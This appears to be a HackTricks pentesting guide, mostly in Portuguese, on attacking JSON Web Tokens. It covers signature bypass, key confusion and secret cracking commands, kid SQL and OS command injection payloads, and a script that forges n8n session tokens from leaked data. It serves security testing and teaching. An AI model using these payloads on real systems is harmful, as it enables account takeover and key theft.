# JWT Vulnerabilidades (Json Web Tokens)

{{#include ../banners/hacktricks-training.md}}

**Parte deste post é baseada no excelente post:** [**https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)\
**Autor da ótima ferramenta para pentesting JWTs** [**https://github.com/ticarpi/jwt_tool**](https://github.com/ticarpi/jwt_tool)

### **Resultados Rápidos**

Execute [**jwt_tool**](https://github.com/ticarpi/jwt_tool) com o modo `All Tests!` e espere pelas linhas verdes
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
Se tiver sorte, a ferramenta encontrará algum caso em que a aplicação web está verificando incorretamente o JWT:

![](<../images/image (935).png>)

Então, você pode procurar a requisição no seu proxy ou extrair o JWT usado para essa requisição usando jwt\_ tool:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
You can also use the [**Burp Extension SignSaboteur**](https://github.com/d0ge/sign-saboteur) to launch JWT attacks from Burp.

### Fluxo prático de avaliação de JWT

- **Delimite o controle de sessão**: Escolha uma request específica do usuário (p.ex., profile, billing). Remova cookies/headers um a um até a request ser rejeitada para isolar qual(is) token(s) realmente controlam a autorização.
- **Localize JWTs no tráfego**: Eles frequentemente aparecem em `Authorization: Bearer <JWT>`, mas também podem estar em custom headers ou cookies. Se o Burp não os destacar, use Target → Site map → Engagement tools → Search com padrões regex como:
- `[= ]eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*`
- `eyJ[a-zA-Z0-9_-]+?\.[a-zA-Z0-9_-]+?\.[a-zA-Z0-9_-]+`
- `[= ]eyJ[A-Za-z0-9_\\/+-]*\.[A-Za-z0-9._\\/+-]*`
- **Decodificar e enumerar**: Use Burp **JWT Editor** ou `python3 jwt_tool.py <JWT>` para ler header/payload. Observe `alg`, `exp`/token lifetime, e claims que dirigem authn/authz (`role`, `id`, `username`, `email`, etc.).
- **Verificação básica da assinatura**: Inverta ou apague alguns bytes na porção de assinatura e reenvie. Aceitação implica validação de assinatura ausente e você pode manipular diretamente os payload claims.
- **Objetivo**: Modificar payload claims para escalar privilégios; todo ataque abaixo visa fazer o servidor aceitar um payload adulterado explorando verificação fraca, secrets fracos, ou seleção de chave insegura.

### Manipular dados sem modificar nada

Você pode simplesmente manipular os dados deixando a signature como está e verificar se o servidor está checando a assinatura. Tente, por exemplo, alterar seu username para "admin".

#### **O token é verificado?**

- Uma mensagem de erro sugere verificação em andamento; detalhes sensíveis em erros verbose devem ser revisados.
- Uma mudança na página retornada também indica verificação.
- Nenhuma mudança sugere ausência de verificação; é nesse caso que você deve experimentar manipular os payload claims.

### Origem

É importante determinar se o token foi gerado no lado do servidor ou no lado do cliente examinando o histórico de requests do proxy.

- Tokens vistos primeiro do lado do cliente sugerem que a key pode estar exposta ao código do cliente, exigindo investigação adicional.
- Tokens originados no servidor indicam um processo mais seguro.

### Duração

Verifique se o token dura mais de 24h... talvez nunca expire. Se houver um campo "exp", verifique se o servidor está lidando corretamente com ele.

### Brute-force HMAC secret

[**See this page.**](../generic-hacking/brute-force.md#jwt)

If the header uses **HS256**, dump the token to a file and try offline cracking:
```bash
python3 jwt_tool.py <JWT> -C -d wordlist.txt
hashcat -a 0 -m 16500 jwt.txt /path/to/wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```
Uma vez que o segredo seja recuperado, carregue-o como uma chave simétrica no Burp JWT Editor e reassine as claims modificadas.

### Derivar segredos JWT a partir de leaked config + DB data

Se uma leitura arbitrária de arquivo (ou backup leak) expõe tanto o **material de encriptação da aplicação** quanto **registros de usuários**, às vezes é possível recriar o segredo de assinatura do JWT e forjar cookies de sessão sem conhecer senhas em texto claro. Padrão observado em stacks de workflow automation:

1. Leak the app key (e.g., `encryptionKey`) from a config file.
2. Leak a tabela de usuários para obter `email`, `password_hash` e `user_id`.
3. Obtenha o segredo de assinatura a partir da chave e, em seguida, calcule o hash por-usuário esperado no payload do JWT:
```python
jwt_secret = sha256(encryption_key[::2]).hexdigest()              # signing key
jwt_hash = b64encode(sha256(f"{email}:{password_hash}")).decode()[:10]
token = jwt.encode({"id": user_id, "hash": jwt_hash}, jwt_secret, "HS256")
```
4. Drop the signed token into the session cookie (e.g., `n8n-auth`) to impersonate the user/admin account even if the password hash is salted.

### Modificar o algoritmo para None

Defina o algoritmo usado como "None" e remova a parte da assinatura.

Use a extensão do Burp chamada "JSON Web Token" para testar essa vulnerabilidade e alterar diferentes valores dentro do JWT (envie a requisição para o Repeater e, na aba "JSON Web Token", você pode modificar os valores do token. Você também pode selecionar colocar o valor do campo "Alg" para "None").

### Trocar o algoritmo RS256(asymmetric) para HS256(symmetric) (CVE-2016-5431/CVE-2016-10555)

O algoritmo HS256 usa a chave secreta para assinar e verificar cada mensagem.\
O algoritmo RS256 usa a chave privada para assinar a mensagem e usa a chave pública para autenticação.

Se você mudar o algoritmo de RS256 para HS256, o código do back end usa a chave pública como chave secreta e então usa o algoritmo HS256 para verificar a assinatura.

Então, usando a chave pública e mudando RS256 para HS256 poderíamos criar uma assinatura válida. Você pode recuperar o certificado do servidor web executando isto:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
Using Burp **JWT Editor**, import the RSA public key (from `/.well-known/jwks.json` or a PEM) and run **Attack → HMAC Key Confusion Attack** to automate the HS256 re-sign attempt.

### Nova chave pública dentro do cabeçalho

Um atacante incorpora uma nova chave no cabeçalho do token e o servidor usa essa nova chave para verificar a assinatura (CVE-2018-0114).

This can be done with the "JSON Web Tokens" Burp extension.\
(Envie a requisição para o Repeater, dentro da aba JSON Web Token selecione "CVE-2018-0114" e envie a requisição).

### JWKS Spoofing

As instruções detalham um método para avaliar a segurança de tokens JWT, particularmente aqueles que usam a claim de cabeçalho "jku". Essa claim deve apontar para um arquivo JWKS (JSON Web Key Set) que contém a chave pública necessária para a verificação do token.

- **Avaliar tokens com o cabeçalho "jku"**:
- Verifique a URL da claim "jku" para garantir que ela leve ao arquivo JWKS apropriado.
- Modifique o valor "jku" do token para apontar para um serviço web sob seu controle, permitindo observar o tráfego.
- **Monitoramento de interação HTTP**:
- Observar requisições HTTP para a URL especificada indica tentativas do servidor de buscar chaves no link que você forneceu.
- Ao usar `jwt_tool` para esse processo, é crucial atualizar o arquivo `jwtconf.ini` com a localização do seu JWKS pessoal para facilitar os testes.
- **Command for `jwt_tool`**:

- Execute o seguinte comando para simular o cenário com `jwt_tool`:

```bash
python3 jwt_tool.py JWT_HERE -X s
```

### Visão geral de problemas com `kid`

Uma claim de cabeçalho opcional conhecida como `kid` é utilizada para identificar uma chave específica, o que se torna particularmente importante em ambientes onde múltiplas chaves existem para a verificação da assinatura do token. Essa claim ajuda na seleção da chave apropriada para verificar a assinatura do token.

#### Revelando a chave através de `kid`

Quando a claim `kid` está presente no cabeçalho, é recomendado buscar no diretório web pelo arquivo correspondente ou suas variações. Por exemplo, se `"kid":"key/12345"` estiver especificado, deve-se procurar pelos arquivos _/key/12345_ e _/key/12345.pem_ na raiz web.

#### Path Traversal with `kid`

A claim `kid` também pode ser explorada para navegar pelo sistema de arquivos, potencialmente permitindo a seleção de um arquivo arbitrário. É possível testar conectividade ou executar ataques SSRF (Server-Side Request Forgery) alterando o valor do `kid` para apontar a arquivos ou serviços específicos. Manipular o JWT para alterar o valor `kid` mantendo a assinatura original pode ser feito usando a flag `-T` no `jwt_tool`, como demonstrado abaixo:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
Alvejando arquivos com conteúdo previsível, é possível forjar um JWT válido. Por exemplo, o arquivo `/proc/sys/kernel/randomize_va_space` em sistemas Linux, conhecido por conter o valor **2**, pode ser usado no parâmetro `kid` com **2** como senha simétrica para geração do JWT.

Um padrão prático para carregamento frágil de chaves do sistema de arquivos é gerar uma chave HS256 com JWK `k` definida como `AA==`, setar `kid` para uma traversal como `../../../../../../../dev/null`, e re-assinar — algumas implementações tratam o arquivo vazio como um segredo HMAC válido e aceitarão tokens forjados.

#### SQL Injection via "kid"

Se o conteúdo da claim `kid` for usado para buscar uma senha em um banco de dados, uma SQL injection pode ser facilitada modificando o payload `kid`. Um payload de exemplo que usa SQL injection para alterar o processo de assinatura do JWT inclui:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

Essa alteração força o uso de uma chave secreta conhecida, `ATTACKER`, para assinatura do JWT.

#### OS Injection through "kid"

Um cenário onde o parâmetro `kid` especifica um caminho de arquivo usado dentro de um contexto de execução de comando pode levar a vulnerabilidades de Remote Code Execution (RCE). Ao injetar comandos no parâmetro `kid`, é possível expor chaves privadas. Um payload de exemplo para alcançar RCE e exposição de chave é:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u and jku

#### jku

jku significa **JWK Set URL**.\
Se o token usar a claim de **Header** “**jku**” então **verifique a URL fornecida**. Isso deve apontar para uma URL contendo o arquivo JWKS que contém a Public Key para verificar o token. Altere o token para apontar o valor jku para um web service cujo tráfego você possa monitorar.

Primeiro você precisa criar um novo certificado com novas chaves private & public.
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Então você pode usar, por exemplo, [**jwt.io**](https://jwt.io) para criar o novo JWT com as **chaves pública e privada criadas e apontando o parâmetro jku para o certificado criado.** Para criar um certificado jku válido, você pode baixar o original e alterar os parâmetros necessários.

Você pode obter os parâmetros "e" e "n" de um certificado público usando:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
Se o verificador buscar material de chave remotamente, embed uma Burp Collaborator URL em `jku`/`x5u` usando **JWT Editor → Attack → Embed Collaborator payload**. Any callback confirma SSRF-style key retrieval; então hospede seu próprio JWKS/PEM nesse URL e re-assine com sua chave privada para que o serviço valide attacker-minted tokens.

#### x5u

X.509 URL. Uma URI apontando para um conjunto de certificados públicos X.509 (um padrão de formato de certificado) codificados em formato PEM. O primeiro certificado no conjunto deve ser o que foi usado para assinar este JWT. Os certificados subsequentes assinam cada um o anterior, completando assim a cadeia de certificados. X.509 é definido em RFC 52807. Transport security é requerida para transferir os certificados.

Tente **alterar este header para uma URL sob seu controle** e verifique se alguma requisição é recebida. Nesse caso você **poderia manipular o JWT**.

Para forjar um novo token usando um certificado controlado por você, você precisa criar o certificado e extrair as chaves pública e privada:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
Then you can use for example [**jwt.io**](https://jwt.io) to create the new JWT with the **chaves pública e privada criadas e apontando o parâmetro x5u para o certificado .crt criado.**

![](<../images/image (956).png>)

You can also abuse both of these vulns **for SSRFs**.

#### x5c

This parameter may contain the **certificado em base64**:

![](<../images/image (1119).png>)

If the attacker **gerar um certificado autoassinado** and creates a forged token using the corresponding private key and replace the "x5c" parameter’s value with the newly generatedcertificate and modifies the other parameters, namely n, e and x5t then essentially the forgedtoken would get accepted by the server.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### Embedded Public Key (CVE-2018-0114)

Se o JWT tiver uma public key embutida como no seguinte cenário:

![](<../images/image (624).png>)

Usando o seguinte nodejs script, é possível gerar uma public key a partir desses dados:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="​ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"​;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
É possível gerar uma nova chave privada/pública, embutir a nova chave pública dentro do token e usá-la para gerar uma nova assinatura:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Você pode obter o "n" e o "e" usando este script nodejs:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
Finalmente, usando a chave pública e privada e os novos valores "n" e "e" você pode usar [jwt.io](https://jwt.io) para forjar um novo JWT válido com qualquer informação.

### ES256: Revelando a chave privada com o mesmo nonce

Se algumas aplicações usam ES256 e usam o mesmo nonce para gerar dois JWTs, a chave privada pode ser restaurada.

Aqui está um exemplo: [ECDSA: Revealing the private key, if same nonce used (with SECP256k1)](https://asecuritysite.com/encryption/ecd5)

### JTI (JWT ID)

A JTI (JWT ID) claim fornece um identificador único para um JWT Token. Pode ser usado para impedir que o token seja replayed.\
No entanto, imagine uma situação onde o comprimento máximo do ID é 4 (0001-9999). As requisições 0001 e 10001 vão usar o mesmo ID. Portanto, se o backend estiver incrementando o ID a cada requisição, você poderia abusar disso para **replay a request** (precisando enviar 10000 requisições entre cada replay bem-sucedido).

### Claims registradas do JWT


{{#ref}}
https://www.iana.org/assignments/jwt/jwt.xhtml#claims
{{#endref}}

### Outros ataques

**Cross-service Relay Attacks**

Foi observado que algumas aplicações web dependem de um serviço JWT confiável para a geração e gestão dos seus tokens. Há casos em que um token, gerado para um cliente pelo serviço JWT, foi aceito por outro cliente do mesmo serviço JWT. Se a emissão ou renovação de um JWT via um serviço de terceiros for observada, deve-se investigar a possibilidade de criar uma conta em outro cliente desse serviço usando o mesmo username/email. Deve-se então tentar replay do token obtido em uma requisição para o alvo para ver se ele é aceito.

- A aceitação do seu token pode indicar uma vulnerabilidade crítica, potencialmente permitindo o spoofing da conta de qualquer usuário. Contudo, deve-se notar que pode ser necessária autorização para testes mais amplos se for preciso criar uma conta em uma aplicação de terceiros, pois isso pode entrar numa área legal cinzenta.

**Expiry Check of Tokens**

A expiração do token é verificada usando a claim Payload "exp". Como JWTs são frequentemente empregados sem informação de sessão, é necessário cuidado. Em muitos casos, capturar e realizar replay do JWT de outro usuário pode permitir a impersonação desse usuário. A JWT RFC recomenda mitigar ataques de replay de JWT utilizando a claim "exp" para definir um tempo de expiração para o token. Além disso, é crucial que a aplicação implemente verificações relevantes para garantir o processamento desse valor e a rejeição de tokens expirados. Se o token inclui uma claim "exp" e os limites de tempo de teste permitirem, recomenda-se armazenar o token e fazer replay dele após o tempo de expiração ter passado. O conteúdo do token, incluindo parsing de timestamps e verificação de expiração (timestamp em UTC), pode ser lido usando a flag -R do jwt_tool.

- Pode haver um risco de segurança se a aplicação ainda validar o token, pois isso pode implicar que o token nunca expire.

### Ferramentas

- [jwt_tool](https://github.com/ticarpi/jwt_tool) – decodificação, manipulação de claim/header, cracking offline de secret (`-C`) e modos de ataque semi-automatizados (`-M at`).
- [Burp JWT Editor](https://github.com/PortSwigger/jwt-editor) – decode/re-sign no Repeater, gerar chaves customizadas e executar ataques embutidos (**none**, **HMAC key confusion**, **embedded JWK**, **jku/x5u collaborator payloads**).
- [hashcat](https://hashcat.net/hashcat/) `-m 16500` – cracking de secret HS256 acelerado por GPU após exportar JWTs para uma wordlist.


{{#ref}}
https://github.com/ticarpi/jwt_tool
{{#endref}}

## Referências

- [n8n token forge chain – config+DB leak to JWT signing secret](https://github.com/Chocapikk/CVE-2026-21858)
- [Burp Suite – JWT Editor extension](https://github.com/PortSwigger/jwt-editor)
- [jwt_tool attack methodology](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)
- [Keys to JWT Assessments – TrustedSec](https://trustedsec.com/blog/keys-to-jwt-assessments-from-a-cheat-sheet-to-a-deep-dive)

{{#include ../banners/hacktricks-training.md}}
